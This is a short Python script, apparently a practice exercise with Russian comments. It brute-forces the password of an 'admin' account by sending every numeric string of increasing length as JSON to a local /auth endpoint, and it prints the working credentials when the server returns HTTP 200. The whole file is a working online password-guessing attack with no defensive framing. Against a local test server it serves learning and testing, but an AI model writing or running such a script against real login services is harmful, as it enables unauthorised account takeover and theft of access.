import requests

login = 'admin'
alphabet = '0123456789'

base = len(alphabet)

i = 0
length = 0

program = True

while program:
    result = ''
    x = i
    while len(result) < length:
        rest = x % base  # Остаток от деления
        x = x // base  # Целая часть
        result = alphabet[rest] + result
        data = {'login': login, 'password': result}

        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            program = False
            break
    print(result)
    if result == alphabet[-1] * length:
        length += 1
        i = 0
    else:
        i += 1
